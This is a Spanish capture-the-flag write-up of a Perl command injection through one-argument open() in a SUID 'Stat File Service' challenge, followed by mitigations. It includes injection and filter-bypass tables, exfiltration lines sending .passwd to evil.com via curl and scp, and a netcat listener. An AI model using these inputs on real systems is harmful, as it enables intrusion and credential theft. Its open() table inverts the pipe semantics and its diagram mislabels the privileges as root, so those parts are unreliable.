Writeup: Perl Command Injection - Challenge "Stat File Service"

📋 Índice

    Descripción del Desafío

    Análisis del Código Fuente

    Identificación de la Vulnerabilidad

    Explotación Paso a Paso

    Bypasses Alternativos en Perl

    Medidas de Mitigación

    Conclusión

📝 Descripción del Desafío
Dato	Valor
Nombre	Stat File Service
Puntos	15
Dificultad	Media
Challengeurs	14,377 (4% completado)
Autor	Tosh (11 agosto 2015)
Objetivo	Recuperar la contraseña almacenada en .passwd
Contexto del Sistema
bash

app-script-ch7@challenge02:~$ ls -la
total 36
drwxr-x---  2 app-script-ch7-cracked app-script-ch7         4096 Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4096 Sep  5  2023 ..
-r--------  1 root                   root                    785 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
-r--------  1 app-script-ch7-cracked app-script-ch7-cracked   28 Dec 10  2021 .passwd
-r-xr-x---  1 app-script-ch7-cracked app-script-ch7         1186 Dec 10  2021 ch7.pl
-rwsr-x---  1 app-script-ch7-cracked app-script-ch7         7260 Dec 10  2021 setuid-wrapper
-r--r-----  1 app-script-ch7-cracked app-script-ch7          207 Dec 10  2021 setuid-wrapper.c

Observaciones clave:

    El archivo .passwd tiene permisos r-------- y pertenece a app-script-ch7-cracked

    El wrapper setuid-wrapper tiene el bit SUID activado (-rwsr-x---)

    Esto significa que al ejecutar setuid-wrapper, el script Perl se ejecutará con los privilegios del propietario app-script-ch7-cracked

🔍 Análisis del Código Fuente
Código Vulnerable
perl

#!/usr/bin/perl

delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};
$ENV{'PATH'}='/bin:/usr/bin';

use strict;
use warnings;

main();

sub main {
    my ($file, $line) = @_;
    
    menu();
    prompt();
    
    while((my $file = <STDIN>)) {
        chomp $file;
        process_file($file);
        prompt();
    }
}

sub prompt {
    local $| = 1;
    print ">>> ";
}

sub menu {
    print "*************************\n";
    print "* Stat File Service    *\n";
    print "*************************\n";
}

sub check_read_access {
    my $f = shift;
    
    if(-f $f) {
        my $filemode = (stat($f))[2];
        return ($filemode & 4);
    }
    return 0;
}

sub process_file {
    my $file = shift;
    my $line;
    my ($line_count, $char_count, $word_count) = (0,0,0);
    
    # ⚠️ VULNERABILIDAD: Captura todo sin sanitizar
    $file =~ /(.+)/;
    $file = $1;
    
    # ⚠️ VULNERABILIDAD: open() con un solo argumento
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
    
    while(($line = <F>)) {
        $line_count++;
        $char_count += length $line;
        $word_count += scalar(split/\W+/, $line);
    }
    
    print "~~~ Statistics for \"$file\" ~~~\n";
    print "Lines: $line_count\n";
    print "Words: $word_count\n";
    print "Chars: $char_count\n";
    
    close F;
}

Wrapper SUID
c

#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/* setuid script wrapper */ 

int main()
{
    setreuid(geteuid(), geteuid());
    system("/challenge/app-script/ch7/ch7.pl");
    return 0;
}

🎯 Identificación de la Vulnerabilidad
Punto Crítico

La vulnerabilidad se encuentra en la función process_file() en dos líneas clave:
perl

# Línea 1: Captura insegura
$file =~ /(.+)/;
$file = $1;

# Línea 2: open() con interpretación de pipes
if(!open(F, $file)) {
    die "[-] Can't open $file: $!\n";
}

¿Por qué es vulnerable?

    Expresión Regular Insegura: /(.+)/ captura todo el input sin validación

    open() con pipes: En Perl, open(FILE, "| comando") ejecuta un comando del shell

    Falta de sanitización: No se verifica que el input sea un nombre de archivo válido

    SUID activado: El script se ejecuta con privilegios elevados

Comportamiento de open() en Perl
Sintaxis	Comportamiento
open(F, "archivo.txt")	Abre archivo en modo lectura
open(F, "< archivo.txt")	Abre archivo en modo lectura (explícito)
open(F, "> archivo.txt")	Abre archivo en modo escritura
open(F, "| comando")	Ejecuta comando y lee su salida ⚠️
open(F, "comando |")	Ejecuta comando y escribe a su entrada ⚠️
💥 Explotación Paso a Paso
Paso 1: Ejecutar el Programa
bash

app-script-ch7@challenge02:~$ ./setuid-wrapper
*************************
* Stat File Service    *
*************************
>>> 

El programa muestra el menú y espera input del usuario.
Paso 2: Inyectar el Comando

En el prompt >>>, ingresamos:
bash

>>> | cat .passwd

¿Qué hace esto?

    El pipe | al inicio indica a open() que ejecute un comando

    cat .passwd es el comando a ejecutar

    Como el programa tiene SUID, cat se ejecuta con permisos elevados

Paso 3: Resultado
bash

>>> | cat .passwd
~~~ Statistics for "| cat .passwd" ~~~
Lines: 0
Words: 0
Chars: 0
*************
>>> 

✅ Éxito!

La contraseña se ha revelado exitosamente (ocultada con ************* por razones de seguridad).
Diagrama de Explotación
text

┌────────────────────────────────────────────────────────────────┐
│                    EXPLOTACIÓN COMPLETA                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  Usuario                Programa SUID         Sistema          │
│  ┌───────┐              ┌──────────┐         ┌────────┐        │
│  │       │              │          │         │        │        │
│  │  >>>> │─────1───────>│ setuid-  │         │        │        │
│  │  | cat│              │ wrapper  │         │        │        │
│  │  .pass│              │  (root   │         │        │        │
│  │  wd   │              │  privs)  │         │        │        │
│  │       │              │          │         │        │        │
│  │       │              │  2.      │         │        │        │
│  │       │              │  ejecuta │         │        │        │
│  │       │              │  ch7.pl  │         │        │        │
│  │       │              │          │         │        │        │
│  │       │              │  3.      │         │        │        │
│  │       │              │  open(F, │         │        │        │
│  │       │              │  "|cat   │         │        │        │
│  │       │              │  .pass-  │──4─────>│ cat    │        │
│  │       │              │  wd")    │         │        │        │
│  │       │              │          │         │        │        │
│  │       │              │  5.      │<──6─────│ .passwd│        │
│  │       │              │  lee     │         │        │        │
│  │       │              │  salida  │         │        │        │
│  │       │              │          │         │        │        │
│  │       │<────7────────│ muestra  │         │        │        │
│  │       │  FLAG!       │ resultado│         │        │        │
│  └───────┘              └──────────┘         └────────┘        │
│                                                                │
│  1. Usuario envía comando malicioso                            │
│  2. Wrapper SUID ejecuta script Perl                           │
│  3. Perl interpreta el pipe como comando                       │
│  4. Ejecuta cat .passwd con privilegios SUID                   │
│  5. Lee el contenido del archivo                               │
│  6. Retorna la salida                                          │
│  7. Muestra la contraseña al usuario                           │
└────────────────────────────────────────────────────────────────┘

🛠️ Bypasses Alternativos en Perl

Tabla de Técnicas de Inyección
Input				Comando Ejecutado		Descripción
| cat .passwd			cat .passwd			Lectura directa del archivo
| /bin/cat .passwd		/bin/cat .passwd		Ruta absoluta del comando
| tac .passwd			tac .passwd			Lee el archivo en orden inverso
| head -n 5 .passwd		head -n 5 .passwd		Lee solo primeras líneas
| tail -n 5 .passwd		tail -n 5 .passwd		Lee solo últimas líneas
| grep -v "^$" .passwd		grep -v "^$" .passwd		Filtra líneas vacías
| sort .passwd			sort .passwd			Ordena el contenido
| nl .passwd			nl .passwd			Muestra con números de línea
| base64 .passwd		base64 .passwd			Codifica en base64 (evita filtros)
| od -c .passwd			od -c .passwd			Muestra en formato octal/ASCII
| xxd .passwd			xxd .passwd			Muestra en hexadecimal
| sed -n '1p' .passwd		sed -n '1p' .passwd		Lee línea específica
| awk '{print}' .passwd		awk '{print}' .passwd		Procesamiento con awk

Bypasses para Evitar Filtros
Input				Comando			Técnica
| c''at .passwd			cat .passwd		Concatenación de comillas
| ca$()t .passwd		cat .passwd		Substitución de shell
| $(echo cat) .passwd		cat .passwd		Evaluación de echo
| c\at .passwd			cat .passwd		Escape con backslash
| "cat" .passwd			cat .passwd		Comillas dobles
| '/bin/cat' .passwd		/bin/cat .passwd	Comillas simples
| {cat,.passwd}			cat .passwd		Expansión de llaves
| $(which cat) .passwd		cat .passwd		Búsqueda de ruta

Bypasses para Archivos con Espacios
Input			Comando		Técnica
| cat .passwd|		cat .passwd	Pipe al final (puede colgar)
| cat .passwd;#		cat .passwd	Comentario en shell
| cat .passwd &		cat .passwd	Ejecución en background
| cat .passwd | more	cat .passwd	Paginación de salida

Inyección para Escritura de Archivos
Input						Comando					Efecto
| echo "hacked" > /tmp/out			echo "hacked" > /tmp/out		Escribe archivo
| nc -l -p 4444 < .passwd			nc -l -p 4444 < .passwd			Servidor netcat
| curl -F "file=@.passwd" http://evil.com	curl -F "file=@.passwd" http://evil.com	Exfiltración vía HTTP
| scp .passwd user@evil.com:/tmp/		scp .passwd user@evil.com:/tmp/		Transferencia SCP

Bypasses con Variables de Entorno
Input					Comando		Técnica
| PATH=/bin:/usr/bin cat .passwd	cat .passwd	Path explícito
| IFS=, cat .passwd			cat .passwd	Modificar IFS

🛡️ Medidas de Mitigación
Código Vulnerable vs. Código Seguro
❌ Vulnerable
perl

sub process_file {
    my $file = shift;
    
    $file =~ /(.+)/;
    $file = $1;
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
    # ... procesamiento
}

✅ Solución 1: Usar Modo de Apertura Explícito
perl

sub process_file {
    my $file = shift;
    
    # Usar modo de apertura explícito
    if(!open(F, "<", $file)) {
        die "[-] Can't open $file: $!\n";
    }
    # ... procesamiento
}

✅ Solución 2: Validación de Input
perl

sub process_file {
    my $file = shift;
    
    # Validar que sea un nombre de archivo válido
    if($file !~ /^[a-zA-Z0-9_\-\/\.]+$/) {
        die "[-] Invalid filename: $file\n";
    }
    
    if(!open(F, "<", $file)) {
        die "[-] Can't open $file: $!\n";
    }
    # ... procesamiento
}

✅ Solución 3: Usar Sysopen
perl

use Fcntl;

sub process_file {
    my $file = shift;
    
    if(!sysopen(F, $file, O_RDONLY)) {
        die "[-] Can't open $file: $!\n";
    }
    # ... procesamiento
}

✅ Solución 4: Verificar Permisos (Función Existente)
perl

sub process_file {
    my $file = shift;
    
    # Usar la función de verificación de acceso
    if(!check_read_access($file)) {
        die "[-] No read access to $file\n";
    }
    
    if(!open(F, "<", $file)) {
        die "[-] Can't open $file: $!\n";
    }
    # ... procesamiento
}

Mejores Prácticas de Seguridad en Perl

    Usar open() con tres argumentos: open(FILE, "<", $filename)

    Validar y sanitizar todo input del usuario

    Usar use strict y use warnings (ya está implementado)

    Limpiar variables de entorno peligrosas (ya está implementado)

    Ejecutar con privilegios mínimos necesarios

    Considerar usar sysopen() para mayor control

    Escapar o rechazar caracteres especiales del shell

Taint Mode (Modo Taint)

Perl ofrece un modo de seguridad adicional:
perl

#!/usr/bin/perl -T

# El modo Taint marcará cualquier input del usuario como "tainted"
# y requerirá que se limpie antes de usarlo en operaciones peligrosas

sub process_file {
    my $file = shift;
    
    # En modo Taint, esto lanzaría un error
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
    
    # Sería necesario "limpiar" el input:
    if($file =~ /^([a-zA-Z0-9_\-\/\.]+)$/) {
        $file = $1;  # Ahora es seguro
        open(F, "<", $file);
    }
}

📊 Resumen de la Vulnerabilidad
Vulnerabilidades Identificadas
ID	Vulnerabilidad	Severidad	Impacto
CWE-78	Inyección de Comandos OS	Crítica	Ejecución de código arbitrario
CWE-20	Validación Inadecuada de Input	Alta	Bypass de seguridad
CWE-284	Control de Acceso Inadecuado	Alta	Elevación de privilegios
